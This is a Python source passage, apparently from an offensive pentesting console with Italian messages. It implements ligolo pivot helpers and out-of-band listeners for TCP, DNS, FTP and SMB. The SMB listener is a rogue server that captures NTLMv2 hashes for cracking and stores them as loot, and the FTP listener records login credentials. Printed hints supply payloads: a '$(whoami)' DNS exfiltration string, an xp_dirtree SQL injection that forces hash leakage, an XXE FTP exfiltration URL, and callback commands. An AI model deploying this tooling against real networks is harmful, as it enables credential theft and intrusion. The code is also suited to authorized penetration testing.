        return "Nessuna rotta pivot configurata."
    lines = [f"\n  \033[1mRotte pivot ({len(_ligolo_routes)}):\033[0m\n"]
    for i, cidr in enumerate(_ligolo_routes, 1):
        lines.append(f"    [{i}] {cidr} → dev {_LIGOLO_TUN}")
    lines.append("")
    return "\n".join(lines)


def pivot_status() -> str:
    if _ligolo_proc is None or _ligolo_proc.poll() is not None:
        return "Nessun pivot attivo."
    lines = [
        f"\n  \033[92mligolo-proxy:\033[0m attivo "
        f"(porta {_ligolo_port}, PID {_ligolo_proc.pid})",
        f"  \033[92mTUN:\033[0m {_LIGOLO_TUN} "
        f"({'up' if _pivot_tun_exists() else 'down'})",
    ]
    if _ligolo_routes:
        lines.append(f"  \033[1mRotte attive:\033[0m {len(_ligolo_routes)}")
        for i, cidr in enumerate(_ligolo_routes, 1):
            lines.append(f"    [{i}] {cidr}")
    else:
        lines.append("  Nessuna rotta configurata.")

    lhost = _lhost or get_default_ip()
    lines.append("")
    lines.append(f"  \033[1mComando agent:\033[0m")
    lines.append(f"  \033[96m./agent -connect {lhost}:{_ligolo_port} "
                 f"-ignore-cert &\033[0m")
    lines.append("")
    return "\n".join(lines)


# ===================================================================
# Catch — OOB listeners (TCP, DNS, FTP, SMB)
# ===================================================================

_CATCH_TYPES = ("tcp", "dns", "ftp", "smb")
_CATCH_DEFAULT_PORTS = {"tcp": 4444, "dns": 53, "ftp": 2121, "smb": 445}


def _catch_log(server_type: str, client: str, msg: str) -> None:
    import time as _time
    ts = _time.strftime("%H:%M:%S")
    entry = {"ts": ts, "client": client, "msg": msg, "type": server_type}
    with _catch_lock:
        info = _catch_servers.get(server_type)
        if info is not None:
            logs = info["logs"]
            logs.append(entry)
            if len(logs) > _CATCH_LOG_MAX:
                del logs[: len(logs) - _CATCH_LOG_MAX]


# --- TCP raw listener ---------------------------------------------------

class _CatchTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        client = f"{self.client_address[0]}:{self.client_address[1]}"
        _catch_log("tcp", self.client_address[0],
                   f"Connessione da {client}")
        try:
            while True:
                data = self.request.recv(4096)
                if not data:
                    break
                preview = data[:4096]
                try:
                    text = preview.decode("utf-8", errors="replace")
                except Exception:
                    text = preview.hex()
                _catch_log("tcp", self.client_address[0],
                           f"[{len(data)}B] {text}")
        except Exception:
            pass
        _catch_log("tcp", self.client_address[0],
                   f"Disconnessione da {client}")


class _CatchTCPServer(socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        pass


# --- DNS logger ----------------------------------------------------------

class _CatchDNSHandler(socketserver.BaseRequestHandler):
    _QTYPES = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR",
               15: "MX", 16: "TXT", 28: "AAAA", 33: "SRV", 255: "ANY"}

    def handle(self):
        data = self.request[0]
        sock = self.request[1]
        client = self.client_address[0]
        try:
            qname, qtype_num = self._parse_query(data)
        except Exception:
            _catch_log("dns", client, f"Pacchetto DNS malformato ({len(data)}B)")
            return

        qtype = self._QTYPES.get(qtype_num, f"TYPE{qtype_num}")

        token_hit = ""
        for t in _catch_tokens:
            if t in qname.lower():
                token_hit = f"  \033[92m★ TOKEN {t}\033[0m"
                break

        _catch_log("dns", client, f"{qtype} {qname}{token_hit}")

        # empty NXDOMAIN response
        resp = bytearray(data[:2])  # copy txn ID
        resp += b"\x81\x83"         # flags: response, NXDOMAIN
        resp += data[4:6]           # QDCOUNT
        resp += b"\x00\x00\x00\x00\x00\x00"  # ANCOUNT, NSCOUNT, ARCOUNT
        resp += data[12:]           # echo question section
        sock.sendto(bytes(resp), self.client_address)

    @staticmethod
    def _parse_query(data: bytes) -> tuple[str, int]:
        pos = 12  # skip header
        labels = []
        while pos < len(data):
            length = data[pos]
            if length == 0:
                pos += 1
                break
            pos += 1
            labels.append(data[pos:pos + length].decode("ascii", errors="replace"))
            pos += length
        qname = ".".join(labels) if labels else "<empty>"
        qtype = int.from_bytes(data[pos:pos + 2], "big") if pos + 2 <= len(data) else 0
        return qname, qtype


class _CatchDNSServer(socketserver.UDPServer):
    allow_reuse_address = True

    def handle_error(self, request, client_address):
        pass


# --- FTP logger ----------------------------------------------------------

class _CatchFTPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        client = f"{self.client_address[0]}:{self.client_address[1]}"
        _catch_log("ftp", self.client_address[0], f"Connessione da {client}")
        self._send("220 SLConsole FTP ready")
        data_buf: list[bytes] = []
        stor_name = ""
        try:
            while True:
                line = self.rfile.readline(4096)
                if not line:
                    break
                line = line.decode("utf-8", errors="replace").strip()
                if not line:
                    continue
                parts = line.split(None, 1)
                cmd = parts[0].upper()
                arg = parts[1] if len(parts) > 1 else ""

                _catch_log("ftp", self.client_address[0], f"← {line}")

                if cmd == "USER":
                    _catch_log("ftp", self.client_address[0],
                               f"Credenziali: USER={arg}")
                    self._send("331 Password required")
                elif cmd == "PASS":
                    _catch_log("ftp", self.client_address[0],
                               f"Credenziali: PASS={arg}")
                    self._send("230 Login OK")
                elif cmd == "SYST":
                    self._send("215 UNIX Type: L8")
                elif cmd == "TYPE":
                    self._send("200 Type set")
                elif cmd == "PWD":
                    self._send('257 "/" is current directory')
                elif cmd == "CWD":
                    self._send("250 OK")
                elif cmd == "PASV":
                    self._send("425 Use PORT instead")
                elif cmd == "PORT":
                    self._send("200 PORT OK")
                elif cmd == "LIST":
                    self._send("150 Here comes listing")
                    self._send("226 Listing done")
                elif cmd == "STOR":
                    stor_name = arg
                    self._send("150 OK send data")
                    raw = self.rfile.read(65536)
                    if raw:
                        try:
                            text = raw.decode("utf-8", errors="replace")
                        except Exception:
                            text = f"<binary {len(raw)}B>"
                        _catch_log("ftp", self.client_address[0],
                                   f"STOR {stor_name} [{len(raw)}B]: {text[:2048]}")
                    self._send("226 Transfer complete")
                elif cmd == "RETR":
                    self._send("550 File not found")
                elif cmd in ("QUIT", "BYE"):
                    self._send("221 Bye")
                    break
                elif cmd == "FEAT":
                    self._send("211 End")
                elif cmd == "OPTS":
                    self._send("200 OK")
                elif cmd == "SIZE":
                    self._send("550 Not found")
                elif cmd == "MDTM":
                    self._send("550 Not found")
                elif cmd == "EPSV":
                    self._send("500 Not supported")
                elif cmd == "EPRT":
                    self._send("500 Not supported")
                else:
                    self._send("500 Unknown command")
        except Exception:
            pass
        _catch_log("ftp", self.client_address[0], f"Disconnessione da {client}")

    def _send(self, msg: str) -> None:
        self.wfile.write((msg + "\r\n").encode("utf-8"))
        self.wfile.flush()


class _CatchFTPServer(socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        pass


# --- SMB auth capture (pure Python, no impacket) -------------------------
# Minimal SMB1 Negotiate + NTLMSSP challenge/response to grab NTLMv2 hashes.
# Outputs hashes in hashcat -m 5600 format: user::domain:challenge:ntproof:blob

import struct as _struct

_SMB_CHALLENGE = os.urandom(8)


def _smb_neg_response(challenge: bytes) -> bytes:
    """Build SMB1 Negotiate response with NTLMSSP challenge."""
    # NTLMSSP_CHALLENGE token
    target_name = "SEALION".encode("utf-16-le")
    target_info = b""
    # MsvAvNbDomainName (type 2)
    ti_domain = "SEALION".encode("utf-16-le")
    target_info += _struct.pack("<HH", 2, len(ti_domain)) + ti_domain
    # MsvAvNbComputerName (type 1)
    ti_comp = "SLC".encode("utf-16-le")
    target_info += _struct.pack("<HH", 1, len(ti_comp)) + ti_comp
    # MsvAvEOL (type 0)
    target_info += _struct.pack("<HH", 0, 0)

    ntlmssp = b"NTLMSSP\x00"
    ntlmssp += _struct.pack("<I", 2)  # type 2 = challenge
    # target name fields
    offset = 56  # fixed offset after header
    ntlmssp += _struct.pack("<HHI", len(target_name), len(target_name), offset)
    # negotiate flags: NTLM | TARGET_INFO | UNICODE | REQUEST_TARGET
    flags = 0x00028233
    ntlmssp += _struct.pack("<I", flags)
    ntlmssp += challenge  # 8 bytes
    ntlmssp += b"\x00" * 8  # reserved
    # target info fields
    ti_offset = offset + len(target_name)
    ntlmssp += _struct.pack("<HHI", len(target_info), len(target_info), ti_offset)
    ntlmssp += target_name
    ntlmssp += target_info

    # Wrap in SPNEGO / raw -- we send as security blob in SMB1 negotiate resp
    # Build SMB1 Negotiate Protocol Response
    smb_hdr = b"\xffSMB"  # server component
    smb_hdr += b"\x72"     # command: negotiate
    smb_hdr += b"\x00\x00\x00\x00"  # status
    smb_hdr += b"\x88"     # flags: reply + case sensitive
    smb_hdr += _struct.pack("<H", 0xC803)  # flags2: unicode + extended security + long names
    smb_hdr += b"\x00" * 12  # PID_high(2) + signature(8) + reserved(2)
    smb_hdr += _struct.pack("<H", 0)  # TID
    smb_hdr += _struct.pack("<H", 0)  # PID
    smb_hdr += _struct.pack("<H", 0)  # UID
    smb_hdr += _struct.pack("<H", 0)  # MID

    # word count for negotiate response (extended security) = 17 words
    words = b""
    words += _struct.pack("<H", 0)      # dialect index (NT LM 0.12)
    words += b"\x03"                     # security mode
    words += _struct.pack("<H", 1)      # max mpx
    words += _struct.pack("<H", 1)      # max VCs
    words += _struct.pack("<I", 16644)  # max buffer
    words += _struct.pack("<I", 65536)  # max raw
    words += _struct.pack("<I", 0)      # session key
    cap = 0xF3F9  # capabilities: extended security + ...
    words += _struct.pack("<I", cap)
    words += b"\x00" * 8   # system time
    words += _struct.pack("<H", 0)  # server timezone
    words += b"\x00"        # encryption key length

    blob = ntlmssp  # raw NTLMSSP (no SPNEGO wrapper for simplicity)
    byte_count = len(blob) + 16  # + GUID
    guid = os.urandom(16)

    data = _struct.pack("<B", 17)  # word count
    data += words
    data += _struct.pack("<H", byte_count)
    data += guid
    data += blob

    packet = b"\x00" * 4  # NetBIOS placeholder
    packet += smb_hdr
    packet += data
    # fix NetBIOS length
    plen = len(packet) - 4
    packet = b"\x00" + _struct.pack(">I", plen)[1:] + packet[4:]
    return packet


def _smb_parse_ntlmssp_auth(data: bytes) -> dict | None:
    """Extract NTLMv2 fields from an NTLMSSP_AUTH message."""
    idx = data.find(b"NTLMSSP\x00\x03\x00\x00\x00")
    if idx < 0:
        return None
    msg = data[idx:]
    if len(msg) < 88:
        return None

    def _field(off):
        flen = _struct.unpack_from("<H", msg, off)[0]
        foff = _struct.unpack_from("<I", msg, off + 4)[0]
        return msg[foff:foff + flen] if foff + flen <= len(msg) else b""

    lm_resp = _field(12)
    nt_resp = _field(20)
    domain_b = _field(28)
    user_b = _field(36)
    host_b = _field(44)

    try:
        domain = domain_b.decode("utf-16-le", errors="replace")
        user = user_b.decode("utf-16-le", errors="replace")
        host = host_b.decode("utf-16-le", errors="replace")
    except Exception:
        domain = user = host = "?"

    if len(nt_resp) > 24:
        nt_proof = nt_resp[:16].hex()
        blob = nt_resp[16:].hex()
    else:
        nt_proof = nt_resp.hex()
        blob = ""

    return {"user": user, "domain": domain, "host": host,
            "nt_proof": nt_proof, "blob": blob}


class _CatchSMBHandler(socketserver.BaseRequestHandler):
    def handle(self):
        client = self.client_address[0]
        _catch_log("smb", client, f"Connessione da {client}")
        try:
            self._do_smb(client)
        except Exception:
            pass
        _catch_log("smb", client, f"Disconnessione da {client}")

    def _do_smb(self, client: str) -> None:
        conn = self.request
        conn.settimeout(10)

        # 1. Read SMB negotiate request
        raw = self._recv_nb(conn)
        if not raw:
            return

        # 2. Send challenge
        challenge = _SMB_CHALLENGE
        resp = _smb_neg_response(challenge)
        conn.sendall(resp)

        # 3. Read session setup (auth)
        raw2 = self._recv_nb(conn)
        if not raw2:
            return

        auth = _smb_parse_ntlmssp_auth(raw2)
        if auth:
            chall_hex = challenge.hex()
            hashline = (f"{auth['user']}::{auth['domain']}:"
                        f"{chall_hex}:{auth['nt_proof']}:{auth['blob']}")
            _catch_log("smb", client,
                       f"\033[92m[NTLMv2] {auth['user']}@{auth['domain']} "
                       f"({auth['host']})\033[0m")
            _catch_log("smb", client, f"\033[93m{hashline}\033[0m")

            hash_file = LOOT_ROOT / "ntlmv2_hashes.txt"
            LOOT_ROOT.mkdir(parents=True, exist_ok=True)
            with open(hash_file, "a") as f:
                f.write(hashline + "\n")
            _catch_log("smb", client,
                       f"Hash salvato in loot/ntlmv2_hashes.txt")
        else:
            _catch_log("smb", client, "Auth ricevuta ma NTLMSSP non trovato")

        # Send STATUS_LOGON_FAILURE so the client retries
        err_resp = self._smb_error(raw2)
        conn.sendall(err_resp)

    @staticmethod
    def _recv_nb(conn) -> bytes | None:
        try:
            hdr = b""
            while len(hdr) < 4:
                chunk = conn.recv(4 - len(hdr))
                if not chunk:
                    return None
                hdr += chunk
            plen = _struct.unpack(">I", b"\x00" + hdr[1:4])[0]
            data = b""
            while len(data) < plen:
                chunk = conn.recv(plen - len(data))
                if not chunk:
                    return None
                data += chunk
            return data
        except Exception:
            return None

    @staticmethod
    def _smb_error(raw_request: bytes) -> bytes:
        smb_hdr = b"\xffSMB"
        smb_hdr += b"\x73"  # session setup
        smb_hdr += _struct.pack("<I", 0xC000006D)  # STATUS_LOGON_FAILURE
        smb_hdr += b"\x88"
        smb_hdr += _struct.pack("<H", 0xC803)
        smb_hdr += b"\x00" * 18
        data = b"\x00" + _struct.pack("<H", 0)  # word count 0, byte count 0
        packet = b"\x00" * 4 + smb_hdr + data
        plen = len(packet) - 4
        packet = b"\x00" + _struct.pack(">I", plen)[1:] + packet[4:]
        return packet


class _CatchSMBServer(socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        pass


# --- Catch public API ----------------------------------------------------

def catch_start(server_type: str, port: int | None = None) -> str:
    server_type = server_type.lower()
    if server_type not in _CATCH_TYPES:
        return f"Tipo non valido: {server_type}. Tipi: {', '.join(_CATCH_TYPES)}"

    if server_type in _catch_servers:
        info = _catch_servers[server_type]
        return f"{server_type.upper()} listener già attivo sulla porta {info['port']}."

    if port is None:
        port = _CATCH_DEFAULT_PORTS[server_type]

    server_classes = {
        "tcp": (_CatchTCPServer, _CatchTCPHandler),
        "dns": (_CatchDNSServer, _CatchDNSHandler),
        "ftp": (_CatchFTPServer, _CatchFTPHandler),
        "smb": (_CatchSMBServer, _CatchSMBHandler),
    }
    srv_cls, handler_cls = server_classes[server_type]

    try:
        srv = srv_cls(("", port), handler_cls)
    except OSError as exc:
        return f"Impossibile avviare {server_type.upper()} sulla porta {port}: {exc}"

    thr = threading.Thread(target=srv.serve_forever, daemon=True)
    thr.start()

    _catch_servers[server_type] = {"server": srv, "thread": thr,
                                   "port": port, "logs": []}
    _catch_log(server_type, "system",
               f"{server_type.upper()} listener avviato sulla porta {port}")

    lhost = _lhost or get_default_ip()
    hints = {
        "tcp": (f"\033[92mTCP listener attivo sulla porta {port}\033[0m\n"
                f"\n  Verifica callback:\n"
                f"  \033[96mcurl http://{lhost}:{port}/rce\033[0m\n"
                f"  \033[96mnc {lhost} {port}\033[0m\n"),
        "dns": (f"\033[92mDNS listener attivo sulla porta {port}\033[0m\n"
                f"\n  Verifica callback:\n"
                f"  \033[96mnslookup test.oob {lhost}\033[0m\n"
                f"  \033[96mdig @{lhost} -p {port} test.oob\033[0m\n"
                f"\n  Genera token: \033[93mcatch dns token\033[0m\n"),
        "ftp": (f"\033[92mFTP listener attivo sulla porta {port}\033[0m\n"
                f"\n  Payload XXE esfiltra dati via FTP:\n"
                f"  \033[96mftp://{lhost}:{port}/exfil\033[0m\n"),
        "smb": (f"\033[92mSMB listener attivo sulla porta {port}\033[0m\n"
                f"\n  Payload per catturare hash NTLMv2:\n"
                f"  \033[96m\\\\{lhost}\\x\\test\033[0m\n"
                f"\n  Hash salvati in: \033[93mloot/ntlmv2_hashes.txt\033[0m\n"),
    }
    return hints.get(server_type, f"{server_type.upper()} attivo sulla porta {port}")


def catch_stop(server_type: str = "all") -> str:
    server_type = server_type.lower()
    if server_type == "all":
        if not _catch_servers:
            return "Nessun listener attivo."
        stopped = []
        for stype in list(_catch_servers.keys()):
            _stop_one(stype)
            stopped.append(stype.upper())
        return f"Listener arrestati: {', '.join(stopped)}"

    if server_type not in _CATCH_TYPES:
        return f"Tipo non valido: {server_type}. Tipi: {', '.join(_CATCH_TYPES)}"
    if server_type not in _catch_servers:
        return f"Nessun listener {server_type.upper()} attivo."

    _stop_one(server_type)
    return f"{server_type.upper()} listener arrestato."


def _stop_one(server_type: str) -> None:
    info = _catch_servers.pop(server_type, None)
    if info is None:
        return
    srv = info.get("server")
    try:
        srv.shutdown()
        srv.server_close()
    except Exception:
        pass


def catch_status() -> str:
    if not _catch_servers:
        return "Nessun listener OOB attivo."
    lines = ["\n  \033[1mOOB Listeners attivi:\033[0m\n"]
    for stype in _CATCH_TYPES:
        if stype in _catch_servers:
            info = _catch_servers[stype]
            n = len(info["logs"])
            lines.append(f"    \033[92m●\033[0m {stype.upper():<5s}  "
                         f"porta \033[96m{info['port']}\033[0m  "
                         f"({n} {'evento' if n == 1 else 'eventi'})")
    lines.append("")
    return "\n".join(lines)


def catch_logs(server_type: str | None = None) -> list[dict]:
    with _catch_lock:
        if server_type and server_type.lower() in _catch_servers:
            return list(_catch_servers[server_type.lower()]["logs"])
        all_logs = []
        for info in _catch_servers.values():
            all_logs.extend(info["logs"])
        all_logs.sort(key=lambda e: e["ts"])
        return all_logs


def catch_clear_logs(server_type: str = "all") -> str:
    with _catch_lock:
        if server_type.lower() == "all":
            for info in _catch_servers.values():
                info["logs"].clear()
            return "Log di tutti i listener svuotati."
        st = server_type.lower()
        if st in _catch_servers:
            _catch_servers[st]["logs"].clear()
            return f"Log {st.upper()} svuotati."
    return f"Nessun listener {server_type.upper()} attivo."


def catch_dns_token() -> str:
    token = os.urandom(3).hex()
    _catch_tokens.append(token)
    lhost = _lhost or get_default_ip()
    return (f"\n  Token: \033[92m{token}\033[0m\n"
            f"\n  Payload di esempio:\n"
            f"  \033[96m$(whoami).{token}.{lhost}\033[0m\n"
            f"  \033[96mnslookup {token}.{lhost} {lhost}\033[0m\n"
            f"  \033[96m'; EXEC master..xp_dirtree "
            f"'\\\\{token}.{lhost}\\x'--\033[0m\n")
